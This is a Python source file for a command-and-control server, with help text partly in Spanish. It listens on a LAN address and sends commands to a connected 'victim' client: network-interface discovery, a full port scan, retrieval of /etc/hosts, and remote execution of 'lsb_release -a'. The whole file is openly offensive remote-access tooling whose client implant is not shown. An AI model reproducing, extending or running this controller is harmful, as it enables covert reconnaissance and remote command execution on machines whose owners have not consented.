import socket
import argparse
import os
import json
import signal
import sys

parser = argparse.ArgumentParser(description='information Server')
parser.add_argument('--info','-i', help="info del cliente(ip, mac, SO, puertos abiertos)")
parser.add_argument('--net_info', '-nt', action = 'store_true' ,help='obtinene la informacion de red del cliente')
parser.add_argument('--port_scanner', '-ps', action='store_true', help='escaner de puertos en la maquina victima')
parser.add_argument('--get_hosts', '-gs', action='store_true', help="obtinene el /etc/hosts de la victima")
args = parser.parse_args()

ip = '192.168.1.106'
port = 9000
seguir = True
connection_status = None



def get_output(command, socket_connection, connection_status = connection_status):
    s = socket_connection
    if connection_status == True:
        s.send(command.encode())
        response = s.recv(1024)
        return response.decode('utf-8')

def get_SO(command_response):
    print('\n[*]Operative System Info:')
    print(command_response)

def get_netInfo(json_response):
    data = json.loads(json_response)
    for key in data.keys():
        print('''[=]{}: \n\t[*]mac: {} \n\t[*]ip:{}'''.format(key, data[key]['mac'], data[key]['ip']))
def open_ports(json_response):
    data = json.loads(json_response)
    print('Scanned: {} [65535 ports]'.format(data['host']))
    for port in data['puertos']:
        print('\t[*]Discovered open port {}/tcp on {}'.format(port, data.get('host')))

def hosts_info(json_response):
    data = json.loads(json_response)
    print('[*]Getting /etc/hosts')
    print(data)

def interruption(signal, contexto):
    socket_client.send('exit'.encode())
    print('[*]Exiting...')
    sys.exit(0)


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(1)
print('[*]Waiting connections...')

try:
    socket_client, data_client = server.accept()
    print('[*]Connect to:' + str(data_client))
    print('Interactive console to execute commands in the client')
    connection_status = True
except Exception as e:
    raise e
comandos = [
    'net-info',
    'port-scanner',
    'get-os',
    'get-hosts',
    'help',
    'exit'
]
signal.signal(signal.SIGINT, interruption)  
    
while seguir:
   
    console = input('>>> ')

    if console not in comandos:
        print('Command not found, try again')
        continue

    if args.net_info == True or console == 'net-info':
        json_client = get_output('--net_info', socket_client, connection_status)
        get_netInfo(json_client)

    if args.port_scanner == True or console == 'port-scanner':
        all_ports_json = get_output('--port_scanner', socket_client, connection_status)
        open_ports(all_ports_json)

    if args.get_hosts == True or console == 'get-hosts':
        hosts_json = get_output('--get_hosts', socket_client, connection_status)
        hosts_info(hosts_json)

    if console == 'get-os':
        response = get_output('lsb_release -a', socket_client, connection_status)
        get_SO(response)

    if console == 'help':
        print('''
    Commands:

    help          >   display this message
    net-info      >   get the interfaces information of the client
    port-scanner   >   scan the open ports in the client
    get-hosts     >   get the etc/host archive
    get-os        >   get os information

        ''')

    if console == 'exit':
        socket_client.send('exit'.encode())
        print('[!]Closing...')
        sys.exit(0)      


